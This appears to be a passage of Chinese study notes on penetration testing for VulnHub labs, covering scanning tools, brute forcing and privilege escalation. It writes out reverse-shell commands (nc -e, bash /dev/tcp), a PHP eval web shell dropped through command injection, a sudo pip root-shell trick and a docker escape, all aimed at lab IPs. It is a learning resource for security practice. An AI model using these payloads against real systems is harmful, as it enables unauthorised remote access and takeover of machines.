+<h3 id="344-wpscan">3.4.4 wpscan<a class="anchor" href="#344-wpscan">#</a></h3>
+<p><code>wpscan --url http://192.168.174.129/site/wordpress -e u,p</code>
+wpscan是专门用于扫描wordpress网站的漏洞和敏感信息，<code>-e</code>(<code>--enumerate</code>)是枚举，<code>u,p</code>代表枚举用户和插件
+<code>/wp-admin/</code>管理后台登陆地址，<code>/wp-content/</code>存放所有用户上传的内容，<code>/wp-includes/</code>包含JS、CSS、PHP函数库（核心库文件）
+<code>wp-config.php</code>包含数据库账号密码，<code>xmlrpc.php</code>常被利用进行暴力破解或DDoS攻击，<code>readme.html</code>通常泄露WordPress的具体版本号
+<code>wp-json/wp/v2/users</code>是REST API，常被用来枚举系统用户名</p>
+<h3 id="345-gobuster目录扫描更强go语言编写">3.4.5 gobuster目录扫描(更强go语言编写)<a class="anchor" href="#345-gobuster%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f%e6%9b%b4%e5%bc%bago%e8%af%ad%e8%a8%80%e7%bc%96%e5%86%99">#</a></h3>
+<p><code>gobuster dir -u http://目标ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,js,sh,txt,bak,zip,sql,old,env -o scan_result.txt</code>
+gobuster是比dirb更强大的目录枚举工具(go语言编写)，dir使用目录模式，-u(&ndash;url)，-w(&ndash;wordlist)，-t(&ndash;threads)代表线程数，-x(&ndash;extensions)指定要搜索的文件扩展名，-o(output)结果保存到该文件，方便后续用<code>grep</code>过滤分析
+例如字典里的一个词是<code>admin</code>，那么gobuster会同时探测
+<code>http://目标ip/admin</code>
+<code>http://目标ip/admin.php</code>
+<code>http://目标ip/admin.html</code>
+<code>http://目标ip/admin.js</code>&hellip;&hellip;等等</p>
+<p>推荐的字典：<code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+<p>同时有的目录是<code>/~secret</code>形式的，此时需要新的参数
+<code>gobuster fuzz -u http://目标ip/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>，这样gobuster会把字典里的每个词替换到<code>FUZZ</code>位置，请求的路径会变成
+<code>http://目标ip/~secret</code></p>
+<h3 id="346-dirsearch打ctf用">3.4.6 dirsearch（打ctf用）<a class="anchor" href="#346-dirsearch%e6%89%93ctf%e7%94%a8">#</a></h3>
+<p><code>dirsearch -u http://目标 -e php,bak,zip</code></p>
+<h3 id="347-fuff模糊目录扫描">3.4.7 fuff(模糊目录扫描)<a class="anchor" href="#347-fuff%e6%a8%a1%e7%b3%8a%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f">#</a></h3>
+<p><code>ffuf -u &quot;http://192.168.174.132/~secret/FUZZ&quot; -w /usr/share/wordlists/dirb/common.txt -e .txt,.php,bak,html -mc 200</code>
+<code>-mc</code>(match http code)指定只显示200(成功)的页面</p>
+<h2 id="35-base64解码">3.5 Base64解码<a class="anchor" href="#35-base64%e8%a7%a3%e7%a0%81">#</a></h2>
+<p><code>echo &quot;Base64编码&quot; | base64 -d</code></p>
+<h2 id="36-hydra">3.6 Hydra<a class="anchor" href="#36-hydra">#</a></h2>
+<p><code>username.txt</code>存放收集到的所有可能的的用户名（每行一个）
+<code>passwd.txt</code>存放收集到的所有可能的密码（每行一个）
+接着会进行一一对应的尝试
+<code>hydra -L username.txt -P passwd.txt ssh://目标ip</code></p>
+<h2 id="37-netcat">3.7 netcat<a class="anchor" href="#37-netcat">#</a></h2>
+<p><code>nc -lvvp 443</code>
+<code>-l</code>开始监听模式，<code>-v</code>(verbose)显示详细信息，<code>-vv</code>则显示更详细的连接状态，<code>-n</code>不用DNS解析，加快速度，防止因DNS延迟导致连接断开，<code>-p</code>指定端口</p>
+<h2 id="38-ssh私钥密码破解">3.8 SSH私钥密码破解<a class="anchor" href="#38-ssh%e7%a7%81%e9%92%a5%e5%af%86%e7%a0%81%e7%a0%b4%e8%a7%a3">#</a></h2>
+<p><code>python3 /usr/share/john/ssh2john.py /home/kali/Desktop/vulnhub/upfine &gt; passwd</code>
+<code>ssh2john.py</code>是John自带的转换脚本，把SSH私钥文件转换成John能识别的哈希格式
+<code>&gt; passwd</code>将转换后的哈希内容写进<code>passwd</code>，（输出重定向）</p>
+<p><code>john --wordlist=/usr/share/wordlists/fasttrack.txt passwd</code>
+用<code>fasttrack.txt</code>字典破解<code>passwd</code>里的哈希，获得SSH私钥的密码</p>
+<p>输出类似：<code>secret123 (upfine)</code></p>
+<p>成功后赋予upfine文件600权限<code>chmod 600 upfine</code>
+第一个<code>6</code>是拥有者，权限是<code>4+2</code>，即<code>读+写</code>
+第二个<code>0</code>是组用户，无权限
+第三个<code>0</code>是其他人，无权限
+这一步是由于，私钥文件不能被别人读取，如果权限太开放（如<code>644</code>），ssh会拒绝使用私钥文件</p>
+<p>再用<code>ssh -i upfine user@target</code>直接登录（<code>-i</code>是identity file）</p>
+<h1 id="四payload分析">四、Payload分析<a class="anchor" href="#%e5%9b%9bpayload%e5%88%86%e6%9e%90">#</a></h1>
+<h2 id="41">4.1<a class="anchor" href="#41">#</a></h2>
+<p>靶机：<code>http://192.168.174.129/site/busque.php?buscar=nc%20-e%20/bin/bash%20192.168.174.131%205555</code>
+kali linux：<code>nc -lvnp 5555</code></p>
+<ul>
+<li><code>-e /bin/bash</code>告诉netcat一旦连接成功，就运行系统的bash shell</li>
+<li><code>%20</code>是空格的URL编码，因为浏览器orHTTP请求的URL中不能直接包含空格</li>
+<li><code>nc -e /bin/bash 192.168.174.131 5555</code>是正常空格的命令</li>
+</ul>
+<h2 id="42">4.2<a class="anchor" href="#42">#</a></h2>
+<p><code>http://192.168.174.129/site/busque.php?buscar=echo '&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;' &gt; shell.php</code></p>
+<ul>
+<li><code>&lt;?php ... ?&gt;</code>是php代码开始和结束标记</li>
+<li><code>$_POST[&quot;cmd&quot;]</code>是超级全局变量，用于接收通过HTTP POST方法传递过来的数据，参数名为<code>cmd</code></li>
+<li><code>eval()</code>函数，作用是把字符串当作PHP代码执行</li>
+<li>最后的<code>&gt;</code>作用是，把前面的内容存进<code>shell.php</code>文件</li>
+<li>一旦<code>shell.php</code>写入服务器，可以向此文件发送任何PHP代码，服务器都会毫不犹豫地通过<code>eval()</code>执行它</li>
+</ul>
+<h2 id="43-提权思路">4.3 提权思路<a class="anchor" href="#43-%e6%8f%90%e6%9d%83%e6%80%9d%e8%b7%af">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;/bin/bash&#34;</span>)</span></span></code></pre></div><p>调用python的<code>os</code>模块，再调用系统命令<code>/bin/bash</code>开一个新的shell，<code>/bin/bash</code>本身不会提权，提权的是执行它的用户身份</p>
+<h2 id="44-交互式root-shell绑定本地提权">4.4 交互式root shell绑定(本地提权)<a class="anchor" href="#44-%e4%ba%a4%e4%ba%92%e5%bc%8froot-shell%e7%bb%91%e5%ae%9a%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>echo <span style="color:#a5d6ff">&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span style="color:#ff7b72">$(</span>tty<span style="color:#ff7b72">)</span><span style="color:#a5d6ff"> &gt;</span><span style="color:#ff7b72">$(</span>tty<span style="color:#ff7b72">)</span><span style="color:#a5d6ff"> 2&gt;</span><span style="color:#ff7b72">$(</span>tty<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#39;)&#34;</span> &gt; setup.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>sudo pip install .</span></span></code></pre></div><ul>
+<li>整体分析：<code>echo &quot;import os; os.execl(...)&quot; &gt; setup.py</code>本来是要把这段python代码打印出来，由于<code>&gt; setup.py</code>，则把内容写进(重定向)到<code>setup.py</code>文件，最后用pip安装<code>setup.py</code>文件</li>
+<li>os.execl理解：<code>os.execl()</code>是用新程序(<code>/bin/sh</code>)替换当前进程(<code>pip</code>)，即pip进行→变成root shell</li>
+<li>参数理解：<code>'/bin/sh'</code>要执行的程序，<code>'sh'</code>程序名，<code>'-c'</code>执行后面的命令，<code> 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)'</code>重定向输入输出</li>
+<li><code>sh和-c</code>参数理解：<code>os.execl(程序路径, 程序名, 参数1, 参数2,...)</code>这是<code>os.execl()</code>函数的规范，因此拆解为自然语言则是，运行<code>/bin/sh</code>，程序名为<code>sh</code>，使用<code>-c</code>参数，执行后面那段命令字符串(即<code>sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)</code>)</li>
+<li>长参数理解：<code>sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)</code>是让shell正确绑定当前终端，<code>&lt;$(tty)</code>把输入连接到当前终端，<code>&gt;$(tty)</code>把输出连接到当前终端，<code>2&gt;$(tty)</code>把错误输出连接到当前终端</li>
+</ul>
+<p>交互式root shell绑定思路：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>arsene shell
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>   ↓
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>sudo pip <span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>   ↓
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>setup.py 执行
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>   ↓
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>root shell 接管当前终端</span></span></code></pre></div><p>反弹shell思路对比：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>攻击机监听
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>   ↓
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>目标机执行反弹代码
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>   ↓
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>目标机连接攻击机
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>   ↓
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>攻击机获得 shell</span></span></code></pre></div><h2 id="45反弹shell">4.5反弹shell<a class="anchor" href="#45%e5%8f%8d%e5%bc%b9shell">#</a></h2>
+<p>命令注入：<code>bash -i &gt;&amp; /dev/tcp/192.168.174.131/7777 0&gt;&amp;1</code></p>
+<ul>
+<li><code>-i</code>启动交互式（interactive）的Bash窗口，确保连接成功后，能像在本地终端一样输入命令，并能看到提示符和错误信息</li>
+<li><code>&gt;&amp;</code>是合并重定向符号，将标准输出和标准错误都发送到后面的网络连接中</li>
+<li><code>/dev/tcp/IP/PORT</code>是Bash的特殊功能，会与指定ip端口建立一个TCP网络连接</li>
+<li><code>0&gt;&amp;1</code>是重定向输入，将**标准输入(stdin/0)<strong>重定向到</strong>标准输出(1)**指向的地方</li>
+</ul>
+<p>这里需要kali先监听<code>7777</code>端口，</p>
+<h1 id="五权限">五、权限<a class="anchor" href="#%e4%ba%94%e6%9d%83%e9%99%90">#</a></h1>
+<h2 id="51-权限划分">5.1 权限划分<a class="anchor" href="#51-%e6%9d%83%e9%99%90%e5%88%92%e5%88%86">#</a></h2>
+<p>Root权限(UID 0)：最高权限
+普通用户(UID 1000+)：如<code>jangow01</code>
+服务账户(UID &lt; 1000)：如<code>www-data</code></p>
+<h2 id="52-三位数字">5.2 三位数字<a class="anchor" href="#52-%e4%b8%89%e4%bd%8d%e6%95%b0%e5%ad%97">#</a></h2>
+<p>位数：第1位是拥有者，第2位是组用户，第3位是其他人</p>
+<p>4 = 读
+2 = 写
+1 = 执行</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数字</th>
+          <th style="text-align: center">英文</th>
+          <th>含义</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">777</td>
+          <td style="text-align: center">-rwxrwxrwx</td>
+          <td>所有人可读写执行（危险）</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">755</td>
+          <td style="text-align: center"></td>
+          <td>拥有者全权限，别人可读执行</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">644</td>
+          <td style="text-align: center"></td>
+          <td>拥有者读写，别人只读</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">600</td>
+          <td style="text-align: center"></td>
+          <td>拥有者可读写（私钥专用）</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="六vulnhub靶场">六、vulnhub靶场<a class="anchor" href="#%e5%85%advulnhub%e9%9d%b6%e5%9c%ba">#</a></h1>
+<h2 id="61修复适配vmware">6.1修复适配vmware<a class="anchor" href="#61%e4%bf%ae%e5%a4%8d%e9%80%82%e9%85%8dvmware">#</a></h2>
+<h3 id="611-修改启动参数进入单用户模式">6.1.1 修改启动参数进入单用户模式<a class="anchor" href="#611-%e4%bf%ae%e6%94%b9%e5%90%af%e5%8a%a8%e5%8f%82%e6%95%b0%e8%bf%9b%e5%85%a5%e5%8d%95%e7%94%a8%e6%88%b7%e6%a8%a1%e5%bc%8f">#</a></h3>
+<p>启动靶机，在第一个界面加载完成，迅速单击<code>shift</code>进入GRUB菜单，接着<code>e</code>进入编辑模式，将<code>ro</code>（只读）修改为<code>rw</code>（读写），并参数末尾修改为<code>single init=/bin/bash</code>（直接启动到Bash环境，跳过密码验证），按<code>Ctrl + X</code>启动
+（ps：若启动太快，则在<code>.vmx</code>文件最后一行添加<code>bios.bootDelay = &quot;5000&quot;</code>，或者虚拟机→电源→打开电源时进入固件）</p>
+<h3 id="612-修改网卡配置">6.1.2 修改网卡配置<a class="anchor" href="#612-%e4%bf%ae%e6%94%b9%e7%bd%91%e5%8d%a1%e9%85%8d%e7%bd%ae">#</a></h3>
+<p>输入<code>ip a</code>查看当前网卡名称，<code>vim /etc/network/interfaces</code>，将其中的名字修改为<code>ens33</code>，但若发现不存在该文件，这种情况是因为<code>netplan</code>软件接管了网卡管理，进入<code>/etc/netplan</code>文件夹，再进入<code>00-netplan.yaml</code>类似的配置文件，进入用<code>i</code>修改网络接口名称，再按<code>Esc</code>键，输入<code>:wq</code>保存退出</p>
+<h2 id="62-vulnhub打靶思路">6.2 vulnhub打靶思路<a class="anchor" href="#62-vulnhub%e6%89%93%e9%9d%b6%e6%80%9d%e8%b7%af">#</a></h2>
+<h3 id="621-总体">6.2.1 总体<a class="anchor" href="#621-%e6%80%bb%e4%bd%93">#</a></h3>
+<ol>
+<li>端口全扫 → 服务版本</li>
+<li>看网页、目录扫描</li>
+<li>找已知漏洞CVE</li>
+<li>拿shell</li>
+<li>提权（内核、sudo、SUID、定时任务、密码泄露）</li>
+</ol>
+<h3 id="622-提权思路">6.2.2 提权思路<a class="anchor" href="#622-%e6%8f%90%e6%9d%83%e6%80%9d%e8%b7%af">#</a></h3>
+<p>核心逻辑：寻找配置错误、过度授权或已知漏洞，跨越权限边界</p>
+<ol>
+<li>基础信息搜集命令
+<ul>
+<li>用户身份：<code>whoami</code>和<code>id</code>，查看所属用户组，如<code>docker</code>、<code>lxd</code>、<code>sudo</code>组常有特殊提权思路</li>
+<li>内核版本：<code>uname -a</code>或<code>cat /etc/issue</code>，检查是否有DirtyPipe、DirtyCow等内核漏洞</li>
+<li>网络状态：<code>netstat -antp</code>，查看是否有仅监听<code>127.0.0.1</code>的内部服务</li>
+</ul>
+</li>
+<li>sudo权限分析
+<ul>
+<li>原理：检查当前用户是否可以无需密码，或使用已知密码运行root权限命令</li>
+<li>命令：<code>sudo -l</code></li>
+<li>可利用工具<em>GTFOBins</em></li>
+</ul>
+</li>
+<li>SUID权限文件（权限借用）
+<ul>
+<li>原理：SUID位允许普通用户以文件所有者(通常root)的身份运行程序</li>
+<li>命令：<code>find / -perm -u=s -type f 2&gt;/dev/null</code>（见<strong>2.2find</strong>）</li>
+</ul>
+</li>
+<li>计划任务与可写脚本（借刀杀人）
+<ul>
+<li>提权逻辑：
+<ol>
+<li>寻找以root身份运行的任务</li>
+<li>检查该任务调用的<em>脚本或二进制文件</em>是否有写权限</li>
+<li>若有，往脚本注入反弹shell代码：<code>bash -i &gt;&amp; /dev/tcp/我的ip/端口 0&gt;&amp;1</code></li>
+<li>等待cron周期自动触发，就能在<code>nc</code>端收到root shell</li>
+</ol>
+</li>
+<li>查看任务命令：<code>cat /etc/crontab</code>或<code>ls -la /etc/cron.*</code></li>
+</ul>
+</li>
+<li>敏感文件与配置泄露（顺藤摸瓜）
+<ul>
+<li>配置文件：检查Web根目录下的数据连接文件（如<code>/var/www/html</code>下的数据库连接文件<code>config.php</code>等），里面是否有root数据库密码或复用的系统密码</li>
+<li>备份文件：搜索<code>.bak</code>、<code>.sql</code>、<code>.zip</code>等备份</li>
+<li>SSH密钥：检查<code>/home/user/.ssh/id_rsa</code>是否可读，或有无其他用户的私钥遗留</li>
+</ul>
+</li>
+<li>现代容器/环境提权（我不理解）
+<ul>
+<li>Docker组：如果在<code>docker</code>组，可以运行<code>docker run -v /:/mnt --rm -it alpine chroot /mnt</code>直接挂载整个物理根目录</li>
+<li>LXD组：通过挂载镜像的方式获取物理机root权限</li>
+</ul>
+</li>
+</ol>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <footer class="custom-footer">
+  <span class="status-dot"></span>
+  <span>2026 vnccer <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" class="license-link">CC BY 4.0</a></span>
+</footer>
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
